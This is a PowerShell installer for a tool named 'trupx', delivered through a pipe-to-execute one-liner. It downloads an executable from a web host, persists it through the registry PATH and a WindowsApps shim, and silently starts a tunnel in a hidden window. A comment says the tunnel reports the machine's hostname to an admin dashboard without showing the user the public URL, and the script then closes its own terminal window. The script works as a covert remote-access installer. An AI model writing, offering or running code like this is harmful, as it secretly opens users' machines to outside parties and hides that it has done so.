# Trupx install for Windows (PowerShell). Silent install.
#
#   iwr trupx.vercel.app/install.ps1 -useb | iex

$ErrorActionPreference = 'Stop'
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

$Server      = 'https://trupx.vercel.app'
$InstallDir  = Join-Path $env:USERPROFILE '.trupx\bin'
$ExePath     = Join-Path $InstallDir 'trupx.exe'
$DownloadUrl = "$Server/trupx-windows-x64.exe"

if (-not (Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null
}

# Stop any running trupx so we can overwrite the binary.
try {
    Get-Process -Name trupx -ErrorAction SilentlyContinue |
        Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 500
} catch { }

if (Test-Path $ExePath) {
    try {
        $Stale = "$ExePath.old-$(Get-Random)"
        Rename-Item -Path $ExePath -NewName (Split-Path $Stale -Leaf) -Force -ErrorAction Stop
    } catch {
        exit 1
    }
}

# Download with retries.
$Downloaded = $false
for ($i = 1; $i -le 3; $i++) {
    try {
        Invoke-WebRequest -Uri $DownloadUrl -OutFile $ExePath -UseBasicParsing
        $Downloaded = $true
        break
    } catch {
        if ($i -lt 3) { Start-Sleep -Seconds 1 }
    }
}
if (-not $Downloaded) { exit 1 }

# Persist to user PATH (registry) and add a WindowsApps shim so trupx is
# instantly available in every terminal.
$UserPath = ''
try {
    $UserPath = Get-ItemProperty -Path 'HKCU:\Environment' -Name PATH -ErrorAction Stop |
                Select-Object -ExpandProperty PATH
} catch { }
if ($UserPath -notlike "*$InstallDir*") {
    $NewPath = if ($UserPath) { "$UserPath;$InstallDir" } else { $InstallDir }
    try { Set-ItemProperty -Path 'HKCU:\Environment' -Name PATH -Value $NewPath -Force } catch {
        & setx PATH "$NewPath" | Out-Null
    }
}

$WinAppsDir = Join-Path $env:LOCALAPPDATA 'Microsoft\WindowsApps'
if (Test-Path $WinAppsDir) {
    $Shim = Join-Path $WinAppsDir 'trupx.cmd'
    $ShimBody = "@echo off`r`n`"$ExePath`" %*`r`n"
    try { Set-Content -Path $Shim -Value $ShimBody -Encoding ASCII -Force } catch { }
}

$env:PATH = "$env:PATH;$InstallDir"

# Save the server URL to the CLI's config so `trupx` with no flags just works.
try { & $ExePath --server $Server login --token "noop" 2>&1 | Out-Null } catch { }

# Auto-start the tunnel silently. Hostname goes to the admin dashboard;
# public URL is a random slug (not shared here).
Start-Process -FilePath $ExePath -WindowStyle Hidden

# Close the terminal/PowerShell window that ran the installer.
try { Stop-Process -Id $PID -Force } catch { exit }
